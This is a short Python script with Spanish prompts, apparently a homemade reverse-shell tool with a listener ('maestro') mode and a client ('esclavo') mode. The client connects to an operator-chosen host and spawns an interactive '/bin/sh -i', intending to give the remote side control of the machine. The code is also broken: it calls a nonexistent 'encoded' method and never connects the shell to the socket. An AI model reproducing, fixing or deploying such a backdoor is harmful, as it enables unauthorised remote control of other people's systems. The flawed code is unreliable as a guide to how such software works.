import socket   
from colorama import *
import subprocess
import os

def wrshell():
    opcion=input(Fore.GREEN+"ingrese su opcion \n M=maestro E=esclavo \n : ");
    if(opcion == "m" or opcion=="M"):
          host=input(Fore.GREEN+"host: ");
          puerto=int(input(Fore.GREEN+"puerto: "));
          misocket=socket.socket();
          misocket.bind((host,puerto));
          misocket.listen(4);
          while True:
              conexion, addr=misocket.accept();
              print("nueva conexion establecida");
              print(addr);
              mensaje="coneccion exitosa"
              conexion.sendall(mensaje.encode('utf-8'));
    if(opcion == "e" or opcion=="E"):
        hostE=input("host: ");
        puertoE=int(input("puerto: "));
        misocketE=socket.socket();
        misocketE.connect((hostE,puertoE));
        while True:
            p=subprocess.run(["/bin/sh","-i"]);
            misocketE.sendall(p.encoded('utf-8'));
            respuesta=misocketE.recv(1024);
            print(respuesta);
wrshell();
